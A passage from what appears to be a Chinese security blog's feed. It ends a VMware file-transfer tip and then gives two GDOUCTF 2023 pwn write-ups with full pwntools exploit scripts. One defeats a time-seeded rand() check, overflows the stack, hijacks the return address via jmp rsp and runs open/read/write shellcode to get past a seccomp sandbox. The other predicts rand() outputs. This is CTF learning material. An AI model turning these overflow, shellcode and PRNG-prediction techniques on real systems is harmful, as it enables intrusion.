目录下</li></ol><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%865.png" alt="从物理机拖到Linux虚拟机中的文件消失了5.png"></p><ol start="3"><li>这个目录下有 <code>n</code> 个文件夹，<strong>这些文件夹里存放的就是用户从物理机拖到虚拟机里的东西</strong>（<em>一般最左边的就是最近一次拖放的</em>）</li></ol><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%866.png" alt="从物理机拖到Linux虚拟机中的文件消失了6.png"></p><ol start="4"><li>只需将这里面对应的文件移出去即可<br>例如我将 <code>CLion</code> 移到主目录下：<code>mv ./CLion-2022.3.1.tar.gz ~</code></li></ol><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%867.png" alt="从物理机拖到Linux虚拟机中的文件消失了7.png"></p><ol start="5"><li>现在查看主目录的文件夹，就能看到你拖到虚拟机里的文件了</li></ol><hr><h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><h3 id="定期清理"><a href="#定期清理" class="headerlink" title="定期清理"></a>定期清理</h3><ol><li><p>因为每次拖放文件到虚拟机都会在 <code>~/.cache/vmware/drag_and_drop</code> 目录下生成一个文件，长此以往，会特别占用虚拟机的空间</p></li><li><p>所以我们可以定期到 <code>~/.cache/vmware/drag_and_drop</code> 目录下执行 <code>rm -rf *</code>，删除 <code>drag_and_drop</code> 目录下的全部文件</p></li></ol><blockquote><p>在 Windows 虚拟机中同理，<code>Win + R</code> 打开 <code>运行</code>，在 <code>运行</code> 中输入 <code>%temp%</code><br>或者打开 <code>C:\Users\用户名\AppData\Local\Temp</code> 路径<br>在 Temp 文件夹中有一个名为 <code>vmware-用户名</code> 的文件夹，里面存放的也是拖放到虚拟机中的文件</p></blockquote><hr><h3 id="共享文件夹"><a href="#共享文件夹" class="headerlink" title="共享文件夹"></a>共享文件夹</h3><blockquote><p>如果往虚拟机中拖放文件、复制文件经常出 bug，也可以通过共享文件夹来向虚拟机传送文件<br>（但是这种方式将物理机和虚拟机联系到了一起，我也不知道开启共享文件夹后，虚拟机病毒会不会影响到物理机）</p></blockquote><ol><li>首先开启共享文件夹，<code>虚拟机 --&gt; 设置 --&gt; 选项 --&gt; 共享文件夹</code></li></ol><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%868.png" alt="从物理机拖到Linux虚拟机中的文件消失了8.png"></p><ol start="2"><li>设置<code>总是启用</code>，<code>添加</code>共享文件夹，选择物理机上的一个文件夹，作为物理机和虚拟机的共享文件夹</li></ol><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%869.png" alt="从物理机拖到Linux虚拟机中的文件消失了9.png"></p><ol start="3"><li><p>后面的保持默认设置即可</p></li><li><p>打开终端，输入 <code>vmware-hgfsclient</code> 检测是否设置成功，我设置的共享文件夹名字叫 <code>&quot;ShareFolder&quot;</code></p></li></ol><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%8610.png" alt="从物理机拖到Linux虚拟机中的文件消失了10.png"></p><ol start="5"><li>一般来说，Linux 中的共享文件夹在目录 <code>/mnt/hgfs</code> 下，也可以在如下位置查看：</li></ol><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%8611.png" alt="从物理机拖到Linux虚拟机中的文件消失了11.png"></p><ol start="6"><li><p>你可以通过把文件放在物理机的 <code>ShareFolder</code> 文件夹下，然后 Ubuntu 虚拟机就可以访问到了</p></li><li><p>如果在目录 <code>/mnt/hgfs</code> 下，还是访问不到你放置的文件<br>或者 <code>cd /mnt/hgfs</code> 后 <code>ls -a</code> 发现什么都没有<br>在终端输入：<code>vmhgfs-fuse .host:/ /mnt/hgfs</code>（将物理机的共享文件夹挂载到目录 <code>/mnt/hgfs</code> 下）</p></li><li><p>退出目录，重新进到目录 <code>/mnt/hgfs</code> 下，即可发现正常访问</p></li></ol><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%8612.png" alt="从物理机拖到Linux虚拟机中的文件消失了12.png"></p><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%8613.png" alt="从物理机拖到Linux虚拟机中的文件消失了13.png"></p><blockquote><p>如果是 Windows 系列的虚拟机，查看共享文件夹就更简单了，可以直接挂载到 <code>&quot;网络&quot;</code> 中，然后进行查看<br>这里就不解释了</p></blockquote><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%8614.png" alt="从物理机拖到Linux虚拟机中的文件消失了14.png"></p>]]></content>
    
    
    <summary type="html">有时候明明安装了 VMtools，却发现文件有时还是无法拖进 Linux 虚拟机，或者拖进虚拟机后文件却并没有出现在对应的文件夹里，不要慌，其实虚拟机没有问题，只需要简单操作一下</summary>
    
    
    
    <category term="日常" scheme="https://www.4ss1du0us.cn/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="日常" scheme="https://www.4ss1du0us.cn/tags/%E6%97%A5%E5%B8%B8/"/>
    
  </entry>
  
  <entry>
    <title>【GDOUCTF 2023】Random</title>
    <link href="https://www.4ss1du0us.cn/2023/0415c7efa2.html"/>
    <id>https://www.4ss1du0us.cn/2023/0415c7efa2.html</id>
    <published>2023-04-26T13:52:37.000Z</published>
    <updated>2023-06-30T11:27:19.654Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>伪随机数结合沙盒保护，<mark>使用 <code>ORW</code> 绕过沙盒</mark></p></li><li><p><mark>栈上空间不够写入，使用 <code>jmp rsp</code> 劫持返回地址</mark></p></li></ul><hr><p><a href="https://www.nssctf.cn/problem/3722">（2023年4月16日）【GDOUCTF 2023】Random</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>分析程序：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-RANDOM1.png" alt="2023GDOUCTF-RANDOM1.png"></p></li><li><p>用 IDA 分析：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-RANDOM2.png" alt="2023GDOUCTF-RANDOM2.png"><br>这个题也用到了猜伪随机数，猜对之后进到 <code>vulnerable()</code> 函数：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-RANDOM3.png" alt="2023GDOUCTF-RANDOM3.png"><br>由于 <code>buf</code> 在栈上的长度是 0x20，这里是可以溢出的<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-RANDOM9.png" alt="2023GDOUCTF-RANDOM9.png"></p></li><li><p>看看字符串里有没有什么可以利用的<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-RANDOM5.png" alt="2023GDOUCTF-RANDOM5.png"><br>好像并没有</p></li><li><p>寻找程序自定义的函数，发现程序通过 <code>sandbox()</code> 函数开启了沙盒保护：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-RANDOM4.png" alt="2023GDOUCTF-RANDOM4.png"><br>使用 <code>prctl()</code> 方式开启的沙盒<br>① <code>prctl(38, 1LL, 0LL, 0LL, 0LL)</code> 中的 38 表示禁用系统调用<br>② <code>prctl(22，2)</code> 表示设置沙盒规则，从而可以实现改变函数的系统调用<br>沙盒保护一般都会限制 <code>execve</code> 的系统调用，例如 <code>one_gadget</code> 和 <code>system</code> 调用，使我们不能正常 <code>get shell</code>，只能通过 <code>ROP</code> 的方式调用 <code>open()</code>、<code>read()</code>、<code>write()</code> 的组合方式来获取 flag</p></li><li><p>使用 <code>seccomp-tools</code> 检查一下程序的沙盒机制<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-RANDOM6.png" alt="2023GDOUCTF-RANDOM6.png"><br><code>if (A != execve) goto 0005</code> 即 <code>return ALLOW</code>，所以程序禁用了 <code>execve</code>，而 <code>system()</code> 需要通过 <code>execve</code> 来实现</p></li><li><p>自定义函数中还有一个 <code>haha()</code> 函数：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-RANDOM7.png" alt="2023GDOUCTF-RANDOM7.png"><br>给出的是一个汇编指令 <code>__asm &#123; jmp     rsp &#125;</code>，可以跟进获得这条指令所在的地址：<code>0x40094E</code><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-RANDOM8.png" alt="2023GDOUCTF-RANDOM8.png"></p></li><li><p>因此本题需要使用 ORW<code>（O -- open，R -- read，W -- write）</code> 来绕过沙盒<br>① 首先通过 <code>ctypes</code> 绕过伪随机数校验，跳转到 <code>vulnerable()</code> 函数，但是这里不能通过溢出执行 shellcode 来提权，因为 <code>system()</code> 被沙盒 Ban 了<br>② 由于栈上写入的长度不够，所以得分两次写<br>③ 填充字符到 <code>0x28</code> 够到返回地址，用 <code>jmp rsp</code> 劫持返回地址，让其继续向下运行<br>④ 找到一个可读可写可执行的地址，用于将读取的 flag 存进去，我这里是 <code>data_address = 0x601000</code><br>⑤ 然后用 <code>open()</code> 打开 flag，<code>read()</code> 读取 flag，<code>write()</code> 写出 flag，构造 ORW</p></li><li><p>但是发现有时候远程的伪随机数打不通，应该是远程靶机的版本问题<br>也可以用爆破的方式绕过</p></li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"lease input a guess num:\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    return_str <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'guys'</span> <span class="token keyword">in</span> return_str<span class="token punctuation">:</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>  <span class="token comment"># 导入ctypes库使Python可以执行C语言的函数</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/真男人下120层/bin"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在Linux的路径</span><span class="token keyword">else</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node1.anna.nssctf.cn"</span><span class="token punctuation">,</span> <span class="token number">28391</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口，注意是remote</span><span class="token keyword">def</span> <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    lib <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>  <span class="token comment"># C运行库</span>    v3 <span class="token operator">=</span> lib<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    lib<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>v3<span class="token punctuation">)</span>    number <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>lib<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">50</span><span class="token punctuation">)</span>  <span class="token comment"># 执行随机函数</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"please input a guess num:\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>number<span class="token punctuation">)</span>srand<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 绕过伪随机数</span>jmp_rsp <span class="token operator">=</span> <span class="token number">0x40094E</span>data_address <span class="token operator">=</span> <span class="token number">0x601000</span>  <span class="token comment"># 用vmmap找到一个可读可写的段</span>payload <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> data_address<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 调用read函数，在data_address 0x601000处写入ORW内容</span>payload <span class="token operator">+=</span> asm<span class="token punctuation">(</span><span class="token string">'mov rax,0x601000; call rax'</span><span class="token punctuation">)</span>  <span class="token comment"># call ax寄存器，调用执行data_address 0x601000处的ORW</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>jmp_rsp<span class="token punctuation">)</span>  <span class="token comment"># 溢出到buf栈的返回地址，并将返回地址改成jmp_rsp，继续运行当前rsp后续指令，填写别的返回地址就无法控制程序后面的执行流程了</span>payload <span class="token operator">+=</span> asm<span class="token punctuation">(</span><span class="token string">'sub rsp,0x30; jmp rsp'</span><span class="token punctuation">)</span>  <span class="token comment"># 此时rsp已经离ORW地址偏移0x30,这里把sp挪回到ORW地址并跳转到ORW</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"your door\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>ORW <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./flag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 打开本地的flag文件</span>ORW <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> data_address <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 文件描述符3:其它打开的文件，将flag内容写入到data_address + 0x100地址处</span>ORW <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> data_address <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 文件描述符1:输出到屏幕，输出地址data_address + 0x100处存储的flag内容</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>ORW<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 接收回显</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>NSSCTF{6a3fa38d-f0fe-4d23-960e-b40c015409fc}</p></blockquote><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-RANDOM10.png" alt="2023GDOUCTF-RANDOM10.png"></p>]]></content>
    
    
    <summary type="html">2023 GDOUCTF 比赛中的一道 Pwn 题，考点在于伪随机数绕过和 ORW 沙盒绕过，以及栈上空间不够写入时，使用 `jmp rsp` 劫持返回地址</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.4ss1du0us.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="PWN" scheme="https://www.4ss1du0us.cn/tags/PWN/"/>
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>【GDOUCTF 2023】真男人下120层</title>
    <link href="https://www.4ss1du0us.cn/2023/0427972470.html"/>
    <id>https://www.4ss1du0us.cn/2023/0427972470.html</id>
    <published>2023-04-26T09:52:37.000Z</published>
    <updated>2023-06-07T11:59:33.247Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li>使用 <code>ctypes</code> 库生成伪随机数</li></ul><hr><p><a href="https://www.nssctf.cn/contest/82/">（2023年4月16日）【GDOUCTF 2023】真男人下120层</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>首先查看文件：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-%E7%9C%9F%E7%94%B7%E4%BA%BA%E5%B0%B1%E4%B8%8B120%E5%B1%821.png" alt="2023GDOUCTF-真男人就下120层1.png"></p></li><li><p>用 IDA 查看代码逻辑：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-%E7%9C%9F%E7%94%B7%E4%BA%BA%E5%B0%B1%E4%B8%8B120%E5%B1%822.png" alt="2023GDOUCTF-真男人就下120层2.png"><br>输出信息有点杂乱，运行程序看一下：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-%E7%9C%9F%E7%94%B7%E4%BA%BA%E5%B0%B1%E4%B8%8B120%E5%B1%823.png" alt="2023GDOUCTF-真男人就下120层3.png"><br>这样就看得很清楚了，结合代码，程序大意如下：<br>① 首先根据一些数据生成伪随机数种子<br>② 让我们输入满足 <code>if ( rand() % 4 + 1 != v6 )</code> 条件的 <code>v6</code><br>③ 总共有 120 轮这样的校验，如果全部正确就执行 <code>cat_flag()</code> 函数<br><code>cat_flag()</code> 函数如下：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-%E7%9C%9F%E7%94%B7%E4%BA%BA%E5%B0%B1%E4%B8%8B120%E5%B1%824.png" alt="2023GDOUCTF-真男人就下120层4.png"></p></li><li><p>所以接下来思路就很清晰了，按照伪随机数生成的方法构造 exp 重复输入 120 次即可</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>  <span class="token comment"># 导入ctypes库使Python可以执行C语言的函数</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/真男人下120层/bin"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在Linux的路径</span><span class="token keyword">else</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.anna.nssctf.cn"</span><span class="token punctuation">,</span> <span class="token number">28625</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口，注意是remote</span><span class="token keyword">def</span> <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    lib <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>  <span class="token comment"># C运行库</span>    v3 <span class="token operator">=</span> lib<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    lib<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>v3<span class="token punctuation">)</span>    v4 <span class="token operator">=</span> lib<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span>    lib<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>v4 <span class="token operator">%</span> <span class="token number">3</span> <span class="token operator">-</span> <span class="token number">1522127470</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        number <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>lib<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 执行随机函数</span>        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n\n"</span><span class="token punctuation">)</span>        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>number<span class="token punctuation">)</span>srand<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 接收回显</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>NSSCTF{bc2875e3-3232-4f70-8b78-006e8527f928}</p></blockquote><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023GDOUCTF-%E7%9C%9F%E7%94%B7%E4%BA%BA%E5%B0%B1%E4%B8%8B120%E5%B1%825.png" alt="2023GDOUCTF-真男人就下120层5.png"></p>]]></content>
    
    
    <summary type="html">2023 GDOUCTF 比赛中的一道 Pwn 题，比较简单，主要是利用 ctypes 生成伪随机数，循环输入 120 次即可得到 flag</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.4ss1du0us.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="PWN" scheme="https://www.4ss1du0us.cn/tags/PWN/"/>
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
</feed>
